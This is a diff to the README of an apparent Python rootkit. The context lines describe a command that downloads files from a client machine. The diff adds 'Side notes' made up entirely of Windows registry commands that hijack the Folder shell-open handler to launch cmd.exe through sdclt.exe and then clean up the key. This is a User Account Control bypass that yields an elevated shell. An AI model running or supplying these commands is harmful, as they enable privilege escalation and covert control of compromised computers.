@@ -12,3 +12,7 @@ A simple Python-Rootkit script
   - get|\<filename\> up to download the file from the client to the current folder the script is running.
 
 
+## Side notes:
+reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
+%windir%\system32\sdclt.exe
+reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
